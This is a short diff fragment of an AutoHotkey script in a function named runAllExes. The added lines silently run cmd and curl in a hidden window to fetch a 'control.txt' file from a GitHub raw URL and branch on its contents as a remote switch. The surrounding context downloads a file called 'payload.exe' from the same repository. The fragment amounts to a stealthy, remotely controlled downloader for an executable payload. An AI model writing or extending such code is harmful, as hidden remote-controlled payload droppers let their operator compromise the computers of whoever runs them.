@@ -52,6 +52,17 @@ runAllExes() {
         }
     }
 
+    output := path "\control.txt"
+    url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/control.txt"
+    command := 'cmd /c curl "' . url . '" > "' . output . '"'
+    RunWait command, , "Hide"
+    text := FileRead(output)
+    if (text = "First") {
+        ; add some break here
+    } else if (text = "Second") {
+        ; add some other break here
+    }
+
     try {
         output := path "\payload.exe"
         url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/payload.exe"
